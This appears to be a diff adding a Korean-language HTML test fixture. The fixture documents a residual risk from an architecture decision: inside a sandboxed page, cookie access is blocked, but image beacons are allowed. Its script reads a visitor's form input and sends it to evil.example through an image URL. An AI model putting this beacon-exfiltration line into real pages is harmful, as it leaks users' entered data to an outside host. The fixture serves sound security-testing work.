@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <title>공격: 이미지 비콘 유출 (잔여 위험 문서화)</title>
+</head>
+<body>
+  <h1>무료 체험 신청</h1>
+  <form>
+    <label>이름 <input name="name" id="visitor-name" value="방문자입력값" required /></label>
+    <button type="submit">신청</button>
+  </form>
+  <pre id="attack-result">대기 중</pre>
+  <script>
+    (function () {
+      // ADR 0003 잔여 위험: document.cookie는 sandbox 문서(동일 출처 허용 없음)에서 접근 자체가
+      // 막히므로(예외), 이 픽스처는 그 대신 실제로 열려 있는 경로 — 방문자가 입력한 폼 값을
+      // img-src * 로 허용된 외부 이미지 비콘에 실어 보내는 시도 — 를 보여준다.
+      var out = {};
+      try {
+        var visitorValue = document.getElementById('visitor-name').value;
+        var img = new Image();
+        img.src = 'https://evil.example/?leaked=' + encodeURIComponent(visitorValue);
+        out.beaconAttempted = true;
+        out.leakedVisitorValue = visitorValue;
+      } catch (err) {
+        out.beaconAttempted = false;
+        out.error = { name: err.name, message: err.message };
+      }
+      document.getElementById('attack-result').textContent = JSON.stringify(out);
+    })();
+  </script>
+</body>
+</html>
